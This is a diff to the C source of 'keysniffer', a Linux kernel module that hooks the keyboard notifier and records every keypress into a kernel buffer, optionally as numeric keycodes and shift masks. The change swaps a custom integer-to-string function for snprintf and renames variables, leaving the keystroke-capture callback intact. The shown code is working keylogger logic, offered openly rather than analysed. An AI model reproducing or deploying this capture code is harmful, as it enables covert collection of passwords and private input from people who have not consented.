@@ -27,7 +27,7 @@
 
 #define BUF_LEN (PAGE_SIZE << 2) /* 16KB buffer (assuming 4KB PAGE_SIZE) */
 
-static int codes;
+static int codes;                /* Log type module parameter */
 
 MODULE_LICENSE("GPL v2");
 MODULE_AUTHOR("Arun Prakash Jana <engineerarun@gmail.com>");
@@ -108,53 +108,15 @@ static struct notifier_block keysniffer_blk = {
 	.notifier_call = keysniffer_cb,
 };
 
-/*
- * Function to convert an integer to a base n string representation
- *
- * Parameters :
- *  - input : integer to be converted
- *  - n     : numerical base
- *  - rep   : string buffer to place the representation in
- *  - size  : the max size of the buffer
- */
-void to_base_n_string(int input, int n, char *rep, int size)
-{
-	int i;
-	int start;
-	int remainders[size];
-	int div = input;
-
-	for (i = 0; i < size; i++)
-		rep[i] = 0;
-
-	if (!input) {
-		rep[0] = '0';
-		return;
-	}
-
-	i = size - 1;
-
-	while (div > 0) {
-		remainders[i] = div % n;
-		div = div / n;
-		i--;
-	}
-
-	start = i + 1;
-
-	for (i = start; i < size; i++)
-		rep[i - start] = '0' + remainders[i];
-
-}
-
 /* Keypress callback */
 int keysniffer_cb(struct notifier_block *nblock,
 		  unsigned long code,
 		  void *_param)
 {
 	size_t len;
-	char rep[sizeof(int) + 1];
-	char key[sizeof(int) + 1];
+	int max_len = sizeof(int) + 1;
+	char shift_mask[max_len];
+	char key[max_len];
 	struct keyboard_notifier_param *param = _param;
 	const char *pressed_key;
 
@@ -169,19 +131,17 @@ int keysniffer_cb(struct notifier_block *nblock,
 			? us_keymap[param->value][1]
 			: us_keymap[param->value][0];
 		if (pressed_key) {
-			int pklen, replen;
+			int pk_len, mask_len;
 
 			if (codes) {
-				to_base_n_string(param->value, 10, key, sizeof(int) + 1);
-				to_base_n_string(param->shift, 10, rep, sizeof(int) + 1);
+				snprintf(key, max_len, "%d", param->value);
+				snprintf(shift_mask, max_len, "%d", param->shift);
 				pressed_key = key;
-				pklen = strlen(pressed_key);
-				replen = strlen(rep);
-
-				len = pklen + replen + 1;
+				pk_len = strlen(pressed_key);
+				mask_len = strlen(shift_mask);
+				len = pk_len + mask_len + 1;
 			} else
 				len = strlen(pressed_key);
-
 
 			if ((buf_pos + len) >= BUF_LEN) {
 				memset(keys_buf, 0, BUF_LEN);
@@ -189,13 +149,12 @@ int keysniffer_cb(struct notifier_block *nblock,
 			}
 
 			if (codes) {
-				strncpy(keys_buf + buf_pos, rep, replen);
-				buf_pos += replen;
+				strncpy(keys_buf + buf_pos, shift_mask, mask_len);
+				buf_pos += mask_len;
 				strncpy(keys_buf + buf_pos, " ", 1);
 				buf_pos++;
-				strncpy(keys_buf + buf_pos, pressed_key, pklen);
-				buf_pos += pklen;
-
+				strncpy(keys_buf + buf_pos, pressed_key, pk_len);
+				buf_pos += pk_len;
 			} else {
 				strncpy(keys_buf + buf_pos, pressed_key, len);
 				buf_pos += len;
